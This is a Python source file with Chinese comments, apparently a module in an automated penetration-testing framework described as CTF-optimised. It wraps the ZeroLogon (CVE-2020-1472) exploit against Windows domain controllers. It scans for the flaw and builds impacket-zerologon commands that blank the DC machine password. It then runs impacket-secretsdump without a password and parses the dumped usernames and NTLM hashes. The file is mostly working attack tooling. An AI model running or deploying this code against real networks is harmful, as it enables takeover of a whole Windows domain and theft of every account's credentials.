# tools/zerologon_tool.py
"""
ZeroLogon (CVE-2020-1472) 利用工具

漏洞原理：
- Netlogon协议加密缺陷
- 可将域控密码置空
- 导致域控被接管

利用步骤：
1. 探测漏洞存在
2. 将域控机器账户密码置空
3. Dump域控凭据
4. 恢复域控密码

CTF场景优化:
- 自动检测漏洞
- 一键利用流程

集成：
- app.logger
- tool_framework
"""

from typing import Dict, Any, Optional
import subprocess
import os
import shutil

from tool_framework import CommandLineTool

# 集成日志
try:
    from app.logger import get_logger
except ImportError:
    from logger import get_logger

logger = get_logger("ZeroLogon")


class ZeroLogonTool(CommandLineTool):
    """ZeroLogon利用工具"""

    # 前置条件声明
    REQUIRES_CREDENTIALS = False
    REQUIRES_SHELL_SESSION = False
    TOOL_CATEGORY = "attacker"
    REQUIRES_OS = "any"

    def __init__(self):
        self.timeout = 300
        self.tools_dir = "/opt/tools/zerologon"
        super().__init__("python3")

    def name(self) -> str:
        return "zerologon"

    def description(self) -> str:
        return "ZeroLogon (CVE-2020-1472) 域控漏洞利用工具，可将域控密码置空获取控制权"

    def supported_vulns(self) -> list:
        return ["ZeroLogon", "CVE-2020-1472", "Netlogon", "Domain Controller"]

    def capability_statement(self) -> str:
        return "ZeroLogon域控漏洞利用工具。输入域控IP和名称，自动检测并利用漏洞。适合：Windows域环境、域控攻击。需要：域控NetBIOS名称。"

    def check_available(self) -> bool:
        # 检查impacket工具（pipx安装，使用shutil.which检测命令行工具）
        import shutil
        # impacket安装后提供多个命令行工具
        return shutil.which("impacket-secretsdump") is not None

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: scan/exploit/dump/restore",
                "required": True
            },
            "target": {
                "type": "str",
                "description": "目标域控IP",
                "required": True
            },
            "dc_name": {
                "type": "str",
                "description": "域控NetBIOS名称（如：DC01）",
                "required": True
            },
            "domain": {
                "type": "str",
                "description": "域名",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行ZeroLogon操作"""
        action = params.get("action", "scan")
        dc_ip = params.get("target", target)
        dc_name = params.get("dc_name", "")
        domain = params.get("domain", "")

        action_map = {
            "scan": self._scan_vulnerability,
            "exploit": self._exploit,
            "dump": self._dump_credentials,
            "restore": self._restore_password
        }

        handler = action_map.get(action)
        if not handler:
            return {"error": f"不支持的操作: {action}", "success": False}

        return handler(dc_ip, dc_name, domain)

    def _scan_vulnerability(self, dc_ip: str, dc_name: str, domain: str) -> Dict:
        """扫描ZeroLogon漏洞"""
        results = {"success": True, "vulnerable": False}

        logger.info(f"[ZeroLogon] 扫描目标: {dc_ip}")

        try:
            import socket

            # 探测RPC端口
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            result = sock.connect_ex((dc_ip, 135))
            sock.close()

            if result != 0:
                results["error"] = "RPC端口不可达"
                return results

            # 尝试impacket检测
            if dc_name:
                try:
                    cmd = [
                        "impacket-secretsdump",
                        "-just-dc",
                        "-no-pass",
                        f"{dc_name}$@{dc_ip}"
                    ]

                    result = subprocess.run(
                        cmd, capture_output=True, text=True, timeout=120
                    )

                    if "Administrator" in result.stdout or "KRBTGT" in result.stdout:
                        results["vulnerable"] = True
                        results["evidence"] = "空密码认证成功"
                        logger.warning(f"[ZeroLogon] 发现漏洞: {dc_ip}")

                except subprocess.TimeoutExpired:
                    results["error"] = "扫描超时"
                except FileNotFoundError:
                    results["note"] = "impacket不可用，请手动验证"
            else:
                results["note"] = "需要提供域控NetBIOS名称进行深度检测"

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results

    def _exploit(self, dc_ip: str, dc_name: str, domain: str) -> Dict:
        """执行ZeroLogon利用"""
        results = {"success": True, "steps": []}

        if not dc_name:
            return {"error": "需要提供域控NetBIOS名称", "success": False}

        logger.info(f"[ZeroLogon] 开始利用: {dc_name}@{dc_ip}")

        results["steps"].append({
            "step": "password_zeroing",
            "status": "requires_tool",
            "command": f"impacket-zerologon {dc_name} {dc_ip}"
        })

        results["message"] = "请使用impacket-zerologon执行攻击"
        results["command"] = f"impacket-zerologon {dc_name} {dc_ip}"

        return results

    def _dump_credentials(self, dc_ip: str, dc_name: str, domain: str) -> Dict:
        """Dump域控凭据"""
        results = {"success": True, "credentials": []}

        if not dc_name:
            return {"error": "需要提供域控NetBIOS名称", "success": False}

        logger.info(f"[ZeroLogon] Dump凭据: {dc_name}@{dc_ip}")

        try:
            cmd = [
                "impacket-secretsdump",
                "-just-dc",
                "-no-pass",
                f"{dc_name}$@{dc_ip}"
            ]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=300
            )

            if result.returncode == 0:
                lines = result.stdout.strip().split("\n")
                for line in lines:
                    if "::" in line:
                        parts = line.split(":")
                        if len(parts) >= 4:
                            results["credentials"].append({
                                "username": parts[0],
                                "rid": parts[1],
                                "lm_hash": parts[2],
                                "ntlm_hash": parts[3]
                            })

                logger.info(f"[ZeroLogon] 获取 {len(results['credentials'])} 个凭据")
            else:
                results["success"] = False
                results["error"] = result.stderr

        except FileNotFoundError:
            results["error"] = "impacket-secretsdump不可用"
            results["success"] = False
        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results

    def _restore_password(self, dc_ip: str, dc_name: str, domain: str) -> Dict:
        """恢复域控密码"""
        results = {"success": True}

        logger.info(f"[ZeroLogon] 恢复密码: {dc_name}")

        results["note"] = "恢复密码需要原始凭据"
        results["command"] = f"python3 restorepassword.py {domain}/{dc_name}@{dc_ip} -target-ip {dc_ip}"

        return results

    def get_exploit_commands(self, dc_ip: str, dc_name: str) -> Dict[str, str]:
        """获取利用命令"""
        return {
            "scan": f"impacket-zerologon -scan {dc_ip}",
            "exploit": f"impacket-zerologon {dc_name} {dc_ip}",
            "dump": f"impacket-secretsdump -no-pass {dc_name}$@{dc_ip}",
            "restore": f"python3 restorepassword.py -target-ip {dc_ip}"
        }


# 全局实例
_zerologon_tool = None


def get_zerologon_tool() -> ZeroLogonTool:
    global _zerologon_tool
    if _zerologon_tool is None:
        _zerologon_tool = ZeroLogonTool()
    return _zerologon_tool


def register():
    from tool_framework import ToolRegistry
    ToolRegistry.register(ZeroLogonTool())